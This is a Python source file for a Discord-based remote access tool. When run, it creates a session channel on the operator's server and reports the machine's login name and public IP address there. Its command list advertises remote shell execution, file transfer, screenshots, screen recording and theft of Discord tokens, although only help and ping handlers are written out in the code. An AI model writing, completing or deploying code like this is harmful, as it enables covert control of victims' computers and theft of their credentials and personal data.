import os, discord, json, subprocess, asyncio, requests
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.all()
bot = discord.Client(intents=intents)
session_id = os.urandom(8).hex()
token = os.getenv("TOKEN")
guild_id = os.getenv("GUILD_ID")
commands = "\n".join([
    "!help - Help command",
    "!ping - Ping command",
    "!cd - Change directory",
    "!ls - List directory",
    "!download - Download file",
    "!upload - Upload file",
    "!shell - Execute shell command",
    "!run - Run an file",
    "!exit - Exit the session",
    "!screenshot - Take a screenshot",
    "!record <seconds> - Record the screen",
    "!tokens - Get all discord tokens"
])

@bot.event
async def on_ready():
    guild = bot.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip_address = requests.get("https://api.ipify.org").text
    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
    embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
    embed.add_field(name="IP Address", value=f"```{ip_address}```", inline=True)
    embed.add_field(name="Commands", value=f"```{commands}```", inline=False)
    await channel.send(embed=embed)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.channel.name != session_id:
        return

    if message.content == "!help":
        embed = discord.Embed(title="Help Command", description=f"```{commands}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "!ping":
        embed = discord.Embed(title="Ping Command", description=f"```{round(bot.latency * 1000)}ms```", color=0xfafafa)
        await message.reply(embed=embed)

bot.run(token)

